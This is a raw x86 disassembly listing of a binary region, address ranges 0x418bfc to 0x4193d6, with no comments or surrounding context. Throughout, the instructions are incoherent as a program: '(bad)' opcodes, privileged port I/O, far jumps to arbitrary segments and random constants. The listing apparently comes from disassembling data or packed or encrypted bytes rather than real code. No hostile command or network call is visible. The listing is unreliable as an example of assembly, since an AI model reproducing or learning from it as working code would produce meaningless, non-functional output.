  418bfc:	ins    BYTE PTR es:[edi],dx
  418bfd:	sbb    eax,0x64fb485b
  418c02:	mov    bh,0xa8
  418c04:	dec    esi
  418c05:	lods   eax,DWORD PTR ds:[esi]
  418c06:	push   0x16f366f8
  418c0b:	or     BYTE PTR [ecx],ch
  418c0d:	mov    dl,0x71
  418c0f:	test   eax,0x27e891c9
  418c14:	add    BYTE PTR [ecx+edi*4-0xa257554],bh
  418c1b:	aaa    
  418c1c:	popf   
  418c1d:	aas    
  418c1e:	out    dx,eax
  418c1f:	sbb    DWORD PTR [esi+0x6f],edx
  418c22:	lods   eax,DWORD PTR ds:[esi]
  418c23:	jle    0x418bc1
  418c25:	jo     0x418c10
  418c27:	mov    edx,0x2c5785
  418c2c:	imul   edx,esi,0xffffffb0
  418c2f:	in     eax,dx
  418c30:	sub    ah,0xb3
  418c33:	les    edi,FWORD PTR [ebx-0x73e53586]
  418c39:	sahf   
  418c3a:	inc    ebp
  418c3b:	ror    ecx,1
  418c3d:	sti    
  418c3e:	xlat   BYTE PTR ds:[ebx]
  418c3f:	fcom   DWORD PTR [edi]
  418c41:	out    0x1e,eax
  418c43:	cld    
  418c44:	sub    al,0xde
  418c46:	mov    esi,0x6c1fa2f2
  418c4b:	push   0x8e8cb9f7
  418c50:	dec    ebx
  418c51:	and    eax,0x7277d015
  418c56:	leave  
  418c57:	sbb    eax,0x7cbc4711
  418c5c:	inc    edi
  418c5d:	test   eax,0xa23c3df1
  418c62:	test   BYTE PTR [esi+ecx*4],dl
  418c65:	xchg   ecx,eax
  418c66:	mov    dh,al
  418c68:	lds    ebp,FWORD PTR [eax-0x57]
  418c6b:	mov    ecx,0x4dbcede9
  418c70:	dec    edx
  418c71:	loope  0x418c92
  418c73:	in     al,0x2d
  418c75:	lea    ebx,[ebx]
  418c77:	retf   0x4153
  418c7a:	cmp    DWORD PTR [edx-0x33],eax
  418c7d:	xor    BYTE PTR [esi-0x2e],ah
  418c80:	div    DWORD PTR [edx]
  418c82:	inc    ecx
  418c83:	xchg   esi,eax
  418c84:	push   ds
  418c85:	adc    al,0xc8
  418c87:	fmul   st(7),st
  418c89:	rcr    BYTE PTR [ecx+ebx*8],1
  418c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c8d:	xchg   DWORD PTR [edi+0x33],ebp
  418c90:	fwait
  418c91:	push   eax
  418c92:	ret    
  418c93:	shr    DWORD PTR [ebp+0x3b],0x3c
  418c97:	adc    DWORD PTR [ebx+0x7d],edx
  418c9a:	aad    0xe2
  418c9c:	icebp  
  418c9d:	xor    DWORD PTR [edx-0x60c3f460],ebx
  418ca3:	js     0x418cbc
  418ca5:	cld    
  418ca6:	xor    edx,ecx
  418ca8:	mov    ebx,0x52dee1b5
  418cad:	sbb    al,0x1e
  418caf:	xor    BYTE PTR [eax],cl
  418cb1:	add    esp,DWORD PTR [ecx]
  418cb3:	mov    ds:0xa8a32b04,al
  418cb8:	inc    edi
  418cb9:	xchg   esi,eax
  418cba:	in     eax,dx
  418cbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cbc:	adc    eax,0xfcc7917b
  418cc1:	mov    dh,0xb5
  418cc3:	aas    
  418cc4:	mov    ds:0xe01c9013,eax
  418cc9:	jge    0x418cdd
  418ccb:	jmp    0x3fbc:0xe58bc352
  418cd2:	les    edi,FWORD PTR [ecx]
  418cd4:	pop    ebx
  418cd5:	dec    eax
  418cd6:	or     BYTE PTR [ebx],dl
  418cd8:	pop    ebx
  418cd9:	les    ebp,FWORD PTR [ecx-0x5ea3f29d]
  418cdf:	sub    eax,0xd9f8080c
  418ce4:	int    0x97
  418ce6:	test   al,0xf
  418ce8:	loopne 0x418d2c
  418cea:	mov    ecx,0x56a8533c
  418cef:	call   0xab8c:0x46b60fc6
  418cf6:	aad    0x80
  418cf8:	fist   WORD PTR [ebx]
  418cfa:	rcr    DWORD PTR [edi-0x55bb8704],cl
  418d00:	mov    esi,?
  418d02:	sahf   
  418d03:	in     eax,0x7f
  418d05:	sub    dl,ch
  418d07:	les    ebp,FWORD PTR [edi-0x75]
  418d0a:	shl    ecx,1
  418d0c:	in     eax,0x3
  418d0e:	dec    ebx
  418d0f:	lahf   
  418d10:	cmp    BYTE PTR [edi+edx*4],0xd5
  418d14:	dec    ebp
  418d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d16:	pop    eax
  418d17:	inc    ebx
  418d18:	jnp    0x418cf5
  418d1a:	pop    ebx
  418d1b:	dec    esi
  418d1c:	retf   0x59fe
  418d1f:	aas    
  418d20:	push   es
  418d21:	popa   
  418d22:	mov    eax,0xf47ce8c
  418d27:	add    BYTE PTR [eax+0x46cf6675],bh
  418d2d:	mov    bl,0x30
  418d2f:	bound  ebx,QWORD PTR [ecx+0x448af110]
  418d35:	fidiv  WORD PTR [edx+0x2bc46f0]
  418d3b:	mov    ch,0x7f
  418d3d:	std    
  418d3e:	scas   eax,DWORD PTR es:[edi]
  418d3f:	jmp    0xb9e2:0x38f6855f
  418d46:	push   ebp
  418d47:	pusha  
  418d48:	das    
  418d49:	xchg   esi,eax
  418d4a:	and    BYTE PTR [esi],bl
  418d4c:	sub    DWORD PTR [eax+0x1dea526a],ebp
  418d52:	add    DWORD PTR [ebp-0x1e181ab7],edi
  418d58:	push   esi
  418d59:	push   ds
  418d5a:	xor    al,0xe0
  418d5c:	in     eax,0x51
  418d5e:	cmc    
  418d5f:	(bad)  
  418d60:	or     DWORD PTR [edx],ecx
  418d62:	rcr    BYTE PTR [esi+0x7c],1
  418d65:	sar    DWORD PTR [ebx+0x3d935310],0x88
  418d6c:	and    al,0xe2
  418d6e:	aam    0x27
  418d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d71:	or     al,0xc2
  418d73:	push   es
  418d74:	mov    cl,0xce
  418d76:	cmp    BYTE PTR [edi+eiz*1+0x33],0xa9
  418d7b:	sar    DWORD PTR [eax-0x1df50362],cl
  418d81:	and    DWORD PTR [eax-0x9],esi
  418d84:	jae    0x418d62
  418d86:	js     0x418df4
  418d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d89:	sti    
  418d8a:	pop    esi
  418d8b:	(bad)  
  418d8c:	mov    ebp,0x68c5bfc4
  418d91:	sbb    eax,0xa7ce6689
  418d96:	aas    
  418d97:	add    al,0xe2
  418d99:	dec    edx
  418d9a:	push   cs
  418d9b:	neg    DWORD PTR [bx+si]
  418d9e:	das    
  418d9f:	sbb    BYTE PTR [ebx-0x3bffba72],al
  418da5:	clc    
  418da6:	mov    BYTE PTR [esp+eiz*4-0x4a58dc04],bh
  418dad:	mov    bl,0x17
  418daf:	sti    
  418db0:	sahf   
  418db1:	mov    ch,0x50
  418db3:	(bad)  
  418db4:	(bad)  
  418db6:	and    BYTE PTR [ecx+eiz*8+0x5f],ch
  418dba:	cld    
  418dbb:	and    DWORD PTR [ebx+0x7de45f89],edi
  418dc1:	outs   dx,DWORD PTR ds:[esi]
  418dc2:	pop    eax
  418dc3:	and    DWORD PTR [esi],ecx
  418dc5:	xor    dl,BYTE PTR [eax+eiz*8+0x64b02769]
  418dcc:	sub    al,0x74
  418dce:	sub    eax,0x35cbf6eb
  418dd3:	push   ss
  418dd4:	xchg   dh,bl
  418dd6:	add    DWORD PTR [ecx-0x6f],ebp
  418dd9:	test   al,0xc7
  418ddb:	cdq    
  418ddc:	pusha  
  418ddd:	mov    ds:0x1a3ff81b,al
  418de2:	loope  0x418d7b
  418de4:	push   ds
  418de5:	xor    ch,BYTE PTR [esi]
  418de7:	imul   DWORD PTR [edx-0x4808331c]
  418ded:	xchg   edx,eax
  418dee:	fcmove st,st(2)
  418df0:	loop   0x418dc3
  418df2:	pop    es
  418df3:	gs je  0x418e00
  418df6:	rol    ch,cl
  418df8:	jmp    0xc7fc:0x3d6d278f
  418dff:	lock push 0xffffffc5
  418e02:	sub    cl,BYTE PTR [esp+edx*8+0x13]
  418e06:	rcl    BYTE PTR [edi-0x1f],0x81
  418e0a:	xchg   ebp,eax
  418e0b:	jecxz  0x418e84
  418e0d:	xchg   edx,eax
  418e0e:	pushf  
  418e0f:	retf   
  418e10:	adc    BYTE PTR [ecx],bh
  418e12:	jmp    0xb02a:0x1bd65f8b
  418e19:	and    eax,0x7c6384d8
  418e1e:	nop
  418e1f:	mov    ds:0x4a407964,al
  418e24:	push   cs
  418e25:	push   cs
  418e26:	repnz (bad) 
  418e28:	or     ecx,DWORD PTR [edi]
  418e2a:	ins    DWORD PTR es:[edi],dx
  418e2b:	sbb    DWORD PTR [ebp-0x2a5ab8f9],ecx
  418e31:	cmp    al,0x6f
  418e33:	xchg   esp,eax
  418e34:	pop    ds
  418e35:	sbb    BYTE PTR [ecx-0x2f],0x51
  418e39:	pop    ss
  418e3a:	cdq    
  418e3b:	jmp    0x408e:0x9fd0160d
  418e42:	jmp    0x4e99b907
  418e47:	and    ch,BYTE PTR [edx-0xa]
  418e4a:	jg     0x418e8e
  418e4c:	ds xchg esi,eax
  418e4e:	ret    0xe6c6
  418e51:	ins    BYTE PTR es:[edi],dx
  418e52:	das    
  418e53:	out    0x72,al
  418e55:	cmp    cl,BYTE PTR [ebp-0x40832b88]
  418e5b:	retf   
  418e5c:	pop    esi
  418e5d:	and    cl,cl
  418e5f:	pop    edx
  418e60:	(bad)  
  418e61:	cmp    BYTE PTR ds:0x62f6432c,bh
  418e67:	adc    DWORD PTR [esi],edi
  418e69:	sub    BYTE PTR [ebp+0x6becd6b4],ch
  418e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e70:	or     BYTE PTR [edx+0x1e070906],ch
  418e76:	sbb    dh,bl
  418e78:	call   0xaa67:0xc51f414a
  418e7f:	sub    al,0x5
  418e81:	rcr    DWORD PTR [ebx],1
  418e83:	(bad)  
  418e84:	push   ss
  418e85:	inc    ecx
  418e86:	loope  0x418e70
  418e88:	retf   0xb659
  418e8b:	xchg   DWORD PTR [ecx+0x21],esi
  418e8e:	add    DWORD PTR [ebx],0xb1c034d
  418e94:	and    eax,0xe7c32f4f
  418e99:	nop
  418e9a:	lds    edi,FWORD PTR [edi]
  418e9c:	pop    edx
  418e9d:	or     eax,0xf22794bd
  418ea2:	mov    cl,0xcb
  418ea4:	in     al,dx
  418ea5:	pop    ebp
  418ea6:	clc    
  418ea7:	push   ds
  418ea8:	dec    DWORD PTR [ebp+0x768da57f]
  418eae:	ret    
  418eaf:	jg     0x418eaa
  418eb1:	scas   eax,DWORD PTR es:[edi]
  418eb2:	or     DWORD PTR [ebp+0x40],ecx
  418eb5:	sub    DWORD PTR [eax-0x6856113c],esp
  418ebb:	and    ch,0xc1
  418ebe:	mov    dl,dh
  418ec0:	push   es
  418ec1:	xchg   DWORD PTR [esi-0xaa783bf],esi
  418ec7:	test   DWORD PTR [ebx],esp
  418ec9:	sbb    edi,ecx
  418ecb:	adc    al,0x38
  418ecd:	sub    bh,BYTE PTR [eax+0x66]
  418ed0:	fcom   DWORD PTR [edi+0x3b]
  418ed3:	push   ebp
  418ed4:	repz ret 
  418ed6:	dec    edx
  418ed7:	push   0xffffffec
  418ed9:	enter  0x1922,0xd4
  418edd:	pop    es
  418ede:	dec    esi
  418edf:	and    al,0xfb
  418ee1:	shr    cl,0x4e
  418ee4:	call   0x7d9eb3b2
  418ee9:	mov    ebx,0xf53cd75a
  418eee:	int    0xc3
  418ef0:	pop    ecx
  418ef1:	jle    0x418f0c
  418ef3:	mov    dl,0xa7
  418ef5:	mov    al,ds:0xae038b41
  418efa:	or     edx,esp
  418efc:	jmp    0x427c2400
  418f01:	mov    ecx,0x9f37c984
  418f06:	out    dx,al
  418f07:	and    eax,0x23018302
  418f0c:	adc    eax,0xf4d1c259
  418f11:	rcr    dh,0x8b
  418f14:	dec    edi
  418f15:	pop    es
  418f16:	xchg   edx,eax
  418f17:	jns    0x418f34
  418f19:	mov    ecx,0x995f37c2
  418f1e:	jno    0x418f0f
  418f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f21:	nop
  418f22:	push   edx
  418f23:	lods   eax,DWORD PTR ds:[esi]
  418f24:	shl    BYTE PTR [ebp-0xe],1
  418f27:	mov    bl,0x16
  418f29:	jnp    0x418f98
  418f2b:	xchg   ecx,eax
  418f2c:	and    eax,0xeed4857
  418f31:	dec    ecx
  418f32:	(bad)  
  418f33:	loope  0x418ee3
  418f35:	jns    0x418f9c
  418f37:	push   esp
  418f38:	in     al,dx
  418f39:	shl    BYTE PTR [ebp-0x46d73b1b],1
  418f3f:	adc    edi,edx
  418f41:	mov    cl,0x6b
  418f43:	mov    dh,0xd0
  418f45:	mov    eax,0x8545b02a
  418f4a:	cld    
  418f4b:	jmp    0x2a72c38
  418f50:	mov    ebp,DWORD PTR [esi+0x771b78d0]
  418f56:	jae    0x418f2c
  418f58:	popf   
  418f59:	rol    BYTE PTR [esi],0xe6
  418f5c:	aam    0x6b
  418f5e:	call   0x4e59:0x180eb084
  418f65:	test   DWORD PTR [esi+0x6c],ecx
  418f68:	mov    edx,0xf2225d50
  418f6d:	xor    eax,0x9183f396
  418f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f73:	push   edx
  418f74:	mov    bl,0xdc
  418f76:	lahf   
  418f77:	adc    dl,bl
  418f79:	sbb    al,BYTE PTR [ecx+eiz*2]
  418f7c:	pop    esp
  418f7d:	(bad)  
  418f7e:	out    dx,eax
  418f7f:	pop    ds
  418f80:	loopne 0x418ff5
  418f82:	mov    eax,0x79222f94
  418f87:	dec    edx
  418f88:	mov    esi,0xcea85317
  418f8d:	int3   
  418f8e:	pop    ds
  418f8f:	fdiv   st,st(7)
  418f91:	xor    DWORD PTR [edi],ecx
  418f93:	call   0xbce8:0x5d9778e8
  418f9a:	add    al,0xfb
  418f9c:	test   BYTE PTR [edx],bl
  418f9e:	mov    eax,0xe971da31
  418fa3:	rcl    BYTE PTR [ebx],cl
  418fa5:	scas   eax,DWORD PTR es:[edi]
  418fa6:	(bad)  
  418fa7:	xor    esi,DWORD PTR [ebx+0x21]
  418faa:	or     BYTE PTR [eax-0x44f72755],ah
  418fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fb1:	shr    BYTE PTR [edi],1
  418fb3:	push   es
  418fb4:	add    ebx,DWORD PTR [eax+0x33]
  418fb7:	xchg   DWORD PTR [eax],edi
  418fb9:	pop    ecx
  418fba:	outs   dx,DWORD PTR ds:[esi]
  418fbb:	mov    ebx,0x6c3ea6a4
  418fc0:	jno    0x418fb7
  418fc2:	xor    DWORD PTR [ebp-0x72a0c7e2],0x4c
  418fc9:	dec    edi
  418fca:	inc    ecx
  418fcb:	mov    esi,DWORD PTR [esi-0x53144c13]
  418fd1:	fisttp QWORD PTR [ebp+0x3dff2987]
  418fd7:	mov    WORD PTR [edi],es
  418fd9:	jle    0x419057
  418fdb:	loope  0x418f99
  418fdd:	dec    esp
  418fde:	outs   dx,BYTE PTR ds:[esi]
  418fdf:	jg     0x418f79
  418fe1:	add    DWORD PTR ds:0x8361a455,edx
  418fe7:	iret   
  418fe8:	out    dx,al
  418fe9:	fcom   st(7)
  418feb:	xchg   ebx,eax
  418fec:	out    0x2c,eax
  418fee:	mov    ss,WORD PTR [ecx-0x7b]
  418ff1:	mov    esp,0xda334b1c
  418ff6:	dec    ecx
  418ff7:	add    DWORD PTR [ebp+edx*8-0x7d],ebx
  418ffb:	enter  0x5e3e,0xd9
  418fff:	mov    eax,0xa7de9b1f
  419004:	loope  0x418fca
  419006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419007:	jp     0x41903e
  419009:	loope  0x419062
  41900b:	cli    
  41900c:	fild   DWORD PTR [edi-0x25]
  41900f:	nop
  419010:	mov    eax,ecx
  419012:	jo     0x419046
  419014:	xchg   ecx,eax
  419015:	xchg   edx,eax
  419016:	jl     0x419042
  419018:	sub    edi,DWORD PTR [ebx-0x27]
  41901b:	sbb    al,0x8e
  41901d:	add    DWORD PTR [ecx],ebp
  41901f:	les    ecx,FWORD PTR [edi-0x4fd91e8e]
  419025:	int3   
  419026:	push   ebp
  419027:	mov    ds:0xd5657172,eax
  41902c:	sahf   
  41902d:	mov    al,0x39
  41902f:	and    ah,al
  419031:	mov    dh,0xb7
  419033:	into   
  419034:	sbb    al,dh
  419036:	xchg   esp,eax
  419037:	sbb    al,0x4b
  419039:	cld    
  41903a:	lahf   
  41903b:	scas   eax,DWORD PTR es:[edi]
  41903c:	out    0x65,al
  41903e:	cwde   
  41903f:	jns    0x418fcb
  419041:	cmp    dh,BYTE PTR [ecx+0x66628976]
  419047:	mov    eax,0xc44529a3
  41904c:	aad    0x3f
  41904e:	int3   
  41904f:	xor    bl,BYTE PTR fs:[edi]
  419052:	loop   0x4190b6
  419054:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  419056:	mov    dl,0x9b
  419058:	sbb    DWORD PTR [ebx],eax
  41905a:	ror    DWORD PTR [eax+0x84d759e],0x19
  419061:	ins    DWORD PTR es:[edi],dx
  419062:	mov    dl,0x6d
  419064:	or     eax,0xce4e5522
  419069:	xlat   BYTE PTR ds:[ebx]
  41906a:	in     al,0x1e
  41906c:	ins    BYTE PTR es:[edi],dx
  41906d:	sbb    BYTE PTR [ebx],bh
  41906f:	add    eax,0xa3abe7ec
  419074:	outs   dx,DWORD PTR ds:[esi]
  419075:	sti    
  419076:	scas   eax,DWORD PTR es:[edi]
  419077:	xor    dh,BYTE PTR [esi]
  419079:	out    dx,al
  41907a:	mov    cl,0x1d
  41907c:	mov    ecx,0xe156c945
  419081:	xchg   ecx,eax
  419082:	nop
  419083:	mov    ds:0xe54da88e,al
  419088:	push   eax
  419089:	adc    al,0xb8
  41908b:	jmp    0x419054
  41908d:	call   FWORD PTR [ebx-0x37ddb246]
  419093:	pop    edi
  419094:	xor    esp,DWORD PTR [esi+ebp*2]
  419097:	fst    DWORD PTR [ebp+0x4390d13a]
  41909d:	or     al,0xa4
  41909f:	xchg   ecx,eax
  4190a0:	mov    dh,ch
  4190a2:	test   al,0x3d
  4190a4:	inc    ebp
  4190a5:	or     al,0xfa
  4190a7:	pop    es
  4190a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190a9:	xchg   edx,eax
  4190aa:	mov    eax,ds:0x7cb3e7ff
  4190af:	pop    edx
  4190b0:	repnz scas eax,DWORD PTR es:[edi]
  4190b2:	sahf   
  4190b3:	retf   
  4190b4:	std    
  4190b5:	lods   al,BYTE PTR ds:[esi]
  4190b6:	outs   dx,BYTE PTR ds:[esi]
  4190b7:	ja     0x41903d
  4190b9:	xchg   ebx,eax
  4190ba:	and    eax,0x6d5f849
  4190bf:	or     dh,BYTE PTR [esi-0x41cf0558]
  4190c5:	mov    edx,0xab23c848
  4190ca:	pop    ss
  4190cb:	add    al,0x55
  4190cd:	jge    0x41908e
  4190cf:	or     BYTE PTR [eax+ecx*1-0x32],cl
  4190d3:	sbb    al,0xce
  4190d5:	in     al,dx
  4190d6:	xor    al,0xee
  4190d8:	std    
  4190d9:	test   DWORD PTR [edx-0x19],edx
  4190dc:	aaa    
  4190dd:	jbe    0x419085
  4190df:	fistp  WORD PTR [ecx-0x3d]
  4190e2:	mov    ebx,0x4b6ca67f
  4190e7:	mov    edx,0x9fd7206
  4190ec:	retf   0x4374
  4190ef:	adc    bl,BYTE PTR [ecx+0x54cd44ea]
  4190f5:	loopne 0x419130
  4190f7:	mov    ecx,0x31ce0c5
  4190fc:	xchg   ebx,eax
  4190fd:	inc    ecx
  4190fe:	mov    esp,0xb9e0296d
  419103:	mov    ah,0x59
  419105:	aas    
  419106:	xor    DWORD PTR [ecx-0x13],esp
  419109:	test   eax,0xe0dc70e2
  41910e:	adc    al,0xaf
  419110:	iret   
  419111:	sbb    al,0x86
  419113:	jecxz  0x419173
  419115:	mov    esp,0x19cd7ce3
  41911a:	cmp    eax,0x233afd51
  41911f:	inc    eax
  419120:	es scas eax,DWORD PTR es:[edi]
  419122:	push   0x128ebd39
  419127:	retf   0x3b60
  41912a:	add    esp,DWORD PTR [ebp+0x3e976697]
  419130:	bnd ja 0x4190be
  419133:	cmp    DWORD PTR ds:0x1ad60e3,edi
  419139:	push   0x3ccf292f
  41913e:	pop    ds
  41913f:	loope  0x4190f8
  419141:	mov    cs,WORD PTR [esi-0x1666fe3f]
  419147:	and    ch,BYTE PTR ds:0x97422f2e
  41914d:	out    dx,al
  41914e:	imul   esp,DWORD PTR [edx-0x9421e3],0xffffffce
  419155:	daa    
  419156:	dec    edi
  419157:	dec    ebp
  419158:	test   BYTE PTR [ebp-0x165d5166],bh
  41915e:	jbe    0x41913d
  419160:	inc    ebx
  419162:	in     eax,0x99
  419164:	clc    
  419165:	adc    eax,0x973c852d
  41916a:	retf   0xeba9
  41916d:	(bad)  [eax+0x3b]
  419170:	repnz sub esp,DWORD PTR [edx]
  419173:	int3   
  419174:	push   ebp
  419175:	mov    WORD PTR [esi+ebp*4+0x33],ss
  419179:	jge    0x4191b4
  41917b:	and    al,0x39
  41917d:	adc    al,BYTE PTR [ebp+0x691353f7]
  419183:	sar    DWORD PTR [eax-0x26],cl
  419186:	jne    0x4191eb
  419188:	inc    esi
  419189:	sub    al,BYTE PTR [eax-0x48dd8c02]
  41918f:	outs   dx,DWORD PTR ds:[esi]
  419190:	je     0x4191f4
  419192:	inc    esp
  419193:	pop    ebx
  419194:	call   0x1b31:0xce7a5ec4
  41919b:	jae    0x4191d8
  41919d:	mov    ch,0x9
  41919f:	pop    esi
  4191a0:	out    dx,eax
  4191a1:	repz pop ebx
  4191a3:	or     BYTE PTR [edx-0xe],ah
  4191a6:	cmp    eax,DWORD PTR [eax-0x43]
  4191a9:	mov    DWORD PTR [edi-0x6f],ecx
  4191ac:	adc    eax,0x97f6deaa
  4191b1:	dec    edi
  4191b2:	mov    dl,0x17
  4191b4:	mov    ebp,cs
  4191b6:	dec    esi
  4191b7:	enter  0x29c2,0x69
  4191bb:	mov    ds:0x9a79170f,eax
  4191c0:	fdivr  QWORD PTR [ecx+eiz*2-0x5c]
  4191c4:	addr16 jmp 0x3231f451
  4191ca:	push   ebp
  4191cb:	inc    DWORD PTR cs:[ecx-0x2c2aab45]
  4191d2:	mov    esp,0xb1c420cb
  4191d7:	cs loop 0x4191f5
  4191da:	sbb    ch,BYTE PTR [eax+0x38]
  4191dd:	jns    0x4191cd
  4191df:	ins    BYTE PTR es:[edi],dx
  4191e0:	cmp    DWORD PTR [ecx+0x26bf6059],ebp
  4191e6:	in     al,0xf1
  4191e8:	movsx  esi,BYTE PTR [edx+0x6f17a0c1]
  4191ef:	jge    0x419180
  4191f1:	sbb    al,0x1d
  4191f3:	and    edi,esi
  4191f5:	loopne 0x4191cd
  4191f7:	mov    ds:0xf56ce54f,eax
  4191fc:	retf   0xaf0f
  4191ff:	xor    BYTE PTR [edi-0x7f241551],dl
  419205:	or     BYTE PTR [ebx+eax*8-0x4c],bh
  419209:	push   esp
  41920b:	imul   eax,DWORD PTR [ebx+eiz*8-0x431d5ddb],0xffffff8d
  419213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419214:	xchg   ebx,eax
  419215:	push   0x57
  419217:	push   esp
  419218:	jnp    0x4191ec
  41921a:	pop    esp
  41921b:	pop    ebp
  41921c:	jb     0x419222
  41921e:	sbb    eax,0xc57cae71
  419223:	adc    esi,DWORD PTR [edi]
  419225:	dec    esp
  419226:	cmp    DWORD PTR [ebx+0x71871738],edi
  41922c:	jge    0x4191d8
  41922e:	xor    eax,0xee845410
  419233:	(bad)  
  419234:	xor    ah,BYTE PTR cs:[edi]
  419237:	mov    al,0xcb
  419239:	xchg   ebp,eax
  41923a:	mov    ebp,0x84a1f6cc
  41923f:	sahf   
  419240:	mov    ebx,0x760c9e58
  419245:	lds    edx,FWORD PTR [esi]
  419247:	sub    DWORD PTR ds:0x9aed2e5d,esi
  41924d:	cdq    
  41924e:	inc    esi
  41924f:	xchg   esp,eax
  419250:	mov    WORD PTR [ecx+0x9a197eb],ds
  419256:	jle    0x41926f
  419258:	mov    edi,0x35ea3c81
  41925d:	cmp    esp,eax
  41925f:	ja     0x419275
  419261:	or     eax,0x4a6a95b8
  419266:	sub    al,0x1
  419268:	fwait
  419269:	or     DWORD PTR [edx-0x59f0134c],ecx
  41926f:	shl    ebx,1
  419271:	jnp    0x4192af
  419273:	call   0xf581:0xa0289bdb
  41927a:	pusha  
  41927b:	xor    esi,esi
  41927d:	inc    ecx
  41927e:	push   esi
  41927f:	popa   
  419280:	sahf   
  419281:	push   0xffffffd4
  419283:	test   DWORD PTR [ebp-0x31aa9bc5],ebx
  419289:	mov    eax,0xaba8ae9c
  41928e:	mov    bh,0x33
  419290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419291:	popa   
  419292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419293:	sbb    BYTE PTR [ebx],dl
  419295:	aam    0xd7
  419297:	add    cl,BYTE PTR [ebp+esi*1-0x7a]
  41929b:	or     bh,BYTE PTR [esi]
  41929d:	jle    0x4192e6
  41929f:	push   eax
  4192a0:	and    bh,BYTE PTR [ebx+0x60380ba8]
  4192a6:	push   edx
  4192a7:	jp     0x41930b
  4192a9:	dec    esi
  4192aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192ab:	pop    ds
  4192ac:	and    eax,0xd5a6d0ed
  4192b1:	jge    0x4192c6
  4192b3:	jne    0x4192b3
  4192b5:	push   esp
  4192b6:	dec    eax
  4192b7:	push   DWORD PTR [eax+0x9]
  4192ba:	mov    esp,0x2f35bfd1
  4192bf:	out    dx,eax
  4192c0:	adc    edi,DWORD PTR [edi-0x78]
  4192c3:	ja     0x419299
  4192c5:	xor    al,0x92
  4192c7:	mov    ch,0x2
  4192c9:	dec    DWORD PTR [edi-0x4010ac2f]
  4192cf:	leave  
  4192d0:	mov    eax,fs
  4192d2:	mov    ds:0x8041ec7,eax
  4192d7:	and    al,0x84
  4192d9:	mov    esp,0xc392b358
  4192de:	cmp    al,0x2e
  4192e0:	inc    edi
  4192e1:	adc    bh,BYTE PTR [ecx+0x49]
  4192e4:	inc    ebp
  4192e5:	fwait
  4192e6:	sbb    eax,0x44df2f6d
  4192eb:	push   esi
  4192ec:	pop    edi
  4192ed:	xchg   ebp,eax
  4192ee:	push   edx
  4192ef:	into   
  4192f0:	scas   eax,DWORD PTR es:[edi]
  4192f1:	jmp    0x2d3d125e
  4192f6:	mov    bh,0x1a
  4192f8:	call   0x9c0d80a2
  4192fd:	loope  0x4192d0
  4192ff:	cli    
  419300:	cmp    eax,0xca053e38
  419305:	pushf  
  419306:	pop    es
  419307:	call   0xea70:0x9a443c54
  41930e:	mov    esi,0xb075ac36
  419313:	add    DWORD PTR [ebp+0x5e],edx
  419316:	and    ch,BYTE PTR [esi+eax*1-0x28]
  41931a:	hlt    
  41931b:	pop    ebp
  41931c:	pop    esi
  41931d:	jecxz  0x4192f2
  41931f:	pop    ds
  419320:	inc    eax
  419321:	sub    esp,ecx
  419323:	test   al,0x5
  419325:	fnsave [edx+eax*8+0x28]
  419329:	mov    dh,0x7e
  41932b:	jne    0x419392
  41932d:	sahf   
  41932e:	scas   al,BYTE PTR es:[edi]
  41932f:	sbb    al,0xc8
  419331:	jmp    0x4aa07184
  419336:	pusha  
  419337:	repz sub bl,BYTE PTR [ebp-0x7c]
  41933b:	adc    edi,DWORD PTR [ebx]
  41933d:	shl    dl,0x60
  419340:	std    
  419341:	fxch   st(3)
  419343:	addr16 push edi
  419345:	stos   BYTE PTR es:[edi],al
  419346:	jge    0x4193b3
  419348:	jb     0x41930f
  41934a:	fsub   DWORD PTR [edx-0x57]
  41934d:	mov    bl,0xe
  41934f:	test   BYTE PTR [eax-0x2d317a7f],0x41
  419356:	xor    BYTE PTR [ecx],ah
  419358:	scas   eax,DWORD PTR es:[edi]
  419359:	das    
  41935a:	ins    DWORD PTR es:[edi],dx
  41935b:	xchg   esi,eax
  41935c:	push   esp
  41935d:	fcom   st(5)
  41935f:	mov    DWORD PTR [ecx],0x132fdb3a
  419365:	jl     0x4192f8
  419367:	mov    ebx,0x5b486c62
  41936c:	mov    dl,0x4d
  41936e:	jecxz  0x419338
  419370:	in     al,dx
  419371:	dec    ebx
  419372:	out    dx,al
  419373:	sub    DWORD PTR [ecx-0x52],ebx
  419376:	fisttp WORD PTR ds:0x9a9de6c8
  41937c:	xchg   edi,eax
  41937d:	sbb    DWORD PTR [ecx+0x4b],ebp
  419380:	jle    0x419309
  419382:	mov    eax,0x6ddf26db
  419387:	push   edi
  419388:	stc    
  419389:	fdivr  QWORD PTR [ecx+eax*2+0x618b8420]
  419390:	into   
  419391:	pushf  
  419392:	fs das 
  419394:	aas    
  419395:	mov    edi,0x988ef5c9
  41939a:	out    0xa1,al
  41939c:	mov    ds:0x757ffab0,al
  4193a1:	mov    edi,0x2adb7868
  4193a6:	push   ebx
  4193a7:	mov    ecx,0x8e7193fd
  4193ac:	test   DWORD PTR [ebx+0x3564b4fa],edi
  4193b2:	out    0x90,eax
  4193b4:	aam    0xeb
  4193b6:	scas   eax,DWORD PTR es:[edi]
  4193b7:	imul   esi,DWORD PTR [eax+0x74],0xf8cf1788
  4193be:	imul   edi,ebx,0x8345a222
  4193c4:	std    
  4193c5:	or     DWORD PTR [edi-0x2b],0xacffe7be
  4193cc:	push   ebp
  4193cd:	inc    BYTE PTR [edx]
  4193cf:	bound  esp,QWORD PTR [edi+esi*8+0x39]
  4193d3:	push   eax
  4193d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193d5:	(bad)  
  4193d6:	sub    al,0x8e
